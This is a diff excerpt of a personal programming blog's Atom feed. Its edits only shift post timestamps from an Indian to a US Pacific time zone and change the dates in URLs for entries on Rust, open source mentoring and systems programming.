 <p>So recently I read <a href="https://bitcoincore.org/en/2016/02/26/zero-knowledge-contingent-payments-announcement/">this article</a> about how the Bitcoin community had executed
@@ -1705,7 +2463,7 @@ I believe the proof of concept executed in Greg&rsquo;s post did this, but I&rsq
   <entry>
     <title type="html"><![CDATA[Making Your Open Source Project Newcomer-friendly]]></title>
     <link href="http://manishearth.github.io/blog/2016/01/03/making-your-open-source-project-newcomer-friendly/"/>
-    <updated>2016-01-03T18:56:24+05:30</updated>
+    <updated>2016-01-03T05:26:24-08:00</updated>
     <id>http://manishearth.github.io/blog/2016/01/03/making-your-open-source-project-newcomer-friendly</id>
     <content type="html"><![CDATA[<p>One reason I really like open source is that it offers a lot of great opportunities for newish programmers to get some hands-on experience with real world problems. There&rsquo;s only so much one can learn from small personal projects; but in open source one often gets to tackle interesting problems on large codebases &mdash; problems which wouldn&rsquo;t occur in small/personal ones. There are also valuable skills related to collaboration to be learnt.</p>
 
@@ -1871,9 +2629,9 @@ Additionally, include some tips and tricks (like a link to the internal document
   
   <entry>
     <title type="html"><![CDATA[Designing a GC in Rust]]></title>
-    <link href="http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust/"/>
-    <updated>2015-09-01T00:23:40+05:30</updated>
-    <id>http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust</id>
+    <link href="http://manishearth.github.io/blog/2015/08/31/designing-a-gc-in-rust/"/>
+    <updated>2015-08-31T11:53:40-07:00</updated>
+    <id>http://manishearth.github.io/blog/2015/08/31/designing-a-gc-in-rust</id>
     <content type="html"><![CDATA[<p>For a while I&rsquo;ve been working on a <a href="http://github.com/Manishearth/rust-gc/">garbage collector for Rust</a> with <a href="http://github.com/mystor">Michael
 Layzell</a>. I thought this would be a good time to talk of our design and progress so far.</p>
 
@@ -2305,9 +3063,9 @@ welcome, we&rsquo;d especially love performance improvements and testcases.</p>
   
   <entry>
     <title type="html"><![CDATA[The World's Most Over-engineered Alarm Clock]]></title>
-    <link href="http://manishearth.github.io/blog/2015/08/29/the-worlds-most-over-engineered-alarm-clock/"/>
-    <updated>2015-08-29T00:08:59+05:30</updated>
-    <id>http://manishearth.github.io/blog/2015/08/29/the-worlds-most-over-engineered-alarm-clock</id>
+    <link href="http://manishearth.github.io/blog/2015/08/28/the-worlds-most-over-engineered-alarm-clock/"/>
+    <updated>2015-08-28T11:38:59-07:00</updated>
+    <id>http://manishearth.github.io/blog/2015/08/28/the-worlds-most-over-engineered-alarm-clock</id>
     <content type="html"><![CDATA[<p>A few weeks ago, I set up my Raspberry Pi as a music server so that I could listen to music without
 having to deal with keeping my laptop in a certain corner of the room.</p>
 
@@ -2376,7 +3134,7 @@ able to Linux in my sleep, which is a win-win!</p>
   <entry>
     <title type="html"><![CDATA[Adventures in Systems Programming: C++ Local Statics]]></title>
     <link href="http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics/"/>
-    <updated>2015-06-26T15:32:06+05:30</updated>
+    <updated>2015-06-26T03:02:06-07:00</updated>
     <id>http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics</id>
     <content type="html"><![CDATA[<p>For a while now I&rsquo;ve been quite interested in compilers and systems programming in general; and I
 feel that an important feature of systems programming is that it&rsquo;s relatively easy to figure out
@@ -2853,9 +3611,9 @@ happening there. One step closer to being a better systems programmer!</p>
   
   <entry>
     <title type="html"><![CDATA[How Rust Achieves Thread Safety]]></title>
-    <link href="http://manishearth.github.io/blog/2015/05/30/how-rust-achieves-thread-safety/"/>
-    <updated>2015-05-30T04:25:32+05:30</updated>
-    <id>http://manishearth.github.io/blog/2015/05/30/how-rust-achieves-thread-safety</id>
+    <link href="http://manishearth.github.io/blog/2015/05/29/how-rust-achieves-thread-safety/"/>
+    <updated>2015-05-29T15:55:32-07:00</updated>
+    <id>http://manishearth.github.io/blog/2015/05/29/how-rust-achieves-thread-safety</id>
     <content type="html"><![CDATA[<p><em>In every talk I have given till now, the question &ldquo;how does Rust achieve thread safety?&rdquo;
 has invariably come up<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. I usually just give an overview, but this provides a more comprehensive
 explanation for those who are interested</em></p>
@@ -3011,9 +3769,9 @@ rather it is a perfect storm of small design inconsistencies in the libraries.</
   
   <entry>
     <title type="html"><![CDATA[Github Streak: End-game and Post-mortem]]></title>
-    <link href="http://manishearth.github.io/blog/2015/05/28/github-streak-end-game-and-post-mortem/"/>
-    <updated>2015-05-28T07:48:53+05:30</updated>
-    <id>http://manishearth.github.io/blog/2015/05/28/github-streak-end-game-and-post-mortem</id>
+    <link href="http://manishearth.github.io/blog/2015/05/27/github-streak-end-game-and-post-mortem/"/>
+    <updated>2015-05-27T19:18:53-07:00</updated>
+    <id>http://manishearth.github.io/blog/2015/05/27/github-streak-end-game-and-post-mortem</id>
     <content type="html"><![CDATA[<p>More than a <a href="http://inpursuitoflaziness.blogspot.in/2014/02/50-shades-of-green.html">year ago</a> I blogged (and <a href="http://inpursuitoflaziness.blogspot.in/2014/04/50-more-shades-of-green.html">blogged again</a> later) about my
 <a href="https://github.com/Manishearth">ongoing github streak</a>.</p>
 
@@ -3068,7 +3826,7 @@ I&rsquo;m pretty sure there will be days where I don&rsquo;t want to program fur
   <entry>
     <title type="html"><![CDATA[Wrapper Types in Rust: Choosing Your Guarantees]]></title>
     <link href="http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees/"/>
-    <updated>2015-05-27T20:29:59+05:30</updated>
+    <updated>2015-05-27T07:59:59-07:00</updated>
     <id>http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees</id>
     <content type="html"><![CDATA[<p><em>This post is now <a href="http://doc.rust-lang.org/nightly/book/choosing-your-guarantees.html">a part of the official rust book</a></em></p>
 
@@ -3492,7 +4250,7 @@ we should figure out the tradeoffs as done above and pick one.</p>
   <entry>
     <title type="html"><![CDATA[The Problem With Single-threaded Shared Mutability]]></title>
     <link href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/"/>
-    <updated>2015-05-17T16:56:59+05:30</updated>
+    <updated>2015-05-17T04:26:59-07:00</updated>
     <id>http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability</id>
     <content type="html"><![CDATA[<p>This is a post that I&rsquo;ve been meaning to write for a while now; and the release of Rust 1.0 gives
 me the perfect impetus to go ahead and do it.</p>
@@ -3813,9 +4571,9 @@ also okay to use runtime checks and asserts to maintain your invariants; perform
   
   <entry>
     <title type="html"><![CDATA[Where Rust Really Shines]]></title>
-    <link href="http://manishearth.github.io/blog/2015/05/03/where-rust-really-shines/"/>
-    <updated>2015-05-03T03:49:49+05:30</updated>
-    <id>http://manishearth.github.io/blog/2015/05/03/where-rust-really-shines</id>
+    <link href="http://manishearth.github.io/blog/2015/05/02/where-rust-really-shines/"/>
+    <updated>2015-05-02T15:19:49-07:00</updated>
+    <id>http://manishearth.github.io/blog/2015/05/02/where-rust-really-shines</id>
     <content type="html"><![CDATA[<p>Yesterday I was working on a <a href="https://github.com/rust-lang/rust/pull/25027">small feature</a>
 for the Rust compiler, and came across a situation which really showcased Rust&rsquo;s
 awesomeness as a language.</p>
@@ -4033,9 +4791,9 @@ with much cognitive overhead; I could just follow the compiler and it fixed ever
   
   <entry>
     <title type="html"><![CDATA[New Blog!]]></title>
-    <link href="http://manishearth.github.io/blog/2015/05/03/new-blog/"/>
-    <updated>2015-05-03T03:08:12+05:30</updated>
-    <id>http://manishearth.github.io/blog/2015/05/03/new-blog</id>
+    <link href="http://manishearth.github.io/blog/2015/05/02/new-blog/"/>
+    <updated>2015-05-02T14:38:12-07:00</updated>
+    <id>http://manishearth.github.io/blog/2015/05/02/new-blog</id>
     <content type="html"><![CDATA[<p>I&rsquo;ll be moving from my <a href="http://inpursuitoflaziness.blogspot.in/">old Blogger-powered blog</a>
 to this new one powered by github pages and Octopress. I never enjoyed writing a blog in WYSIWYG
 or HTML (I would constantly switch between both and still get the formatting wrong); Markdown is
